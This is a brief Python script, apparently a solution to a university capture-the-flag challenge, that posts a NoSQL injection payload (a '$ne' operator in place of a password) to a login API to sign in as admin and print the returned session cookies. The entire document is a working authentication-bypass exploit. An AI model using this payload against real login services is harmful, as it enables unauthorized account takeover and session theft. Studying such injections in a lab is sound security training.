import requests


data={'username': "admin", 'password': {"$ne": ""}}
r = requests.post("http://offsec-chalbroker.osiris.cyber.nyu.edu:10001/api/login", json=data)
print(r.text)
print(r.cookies)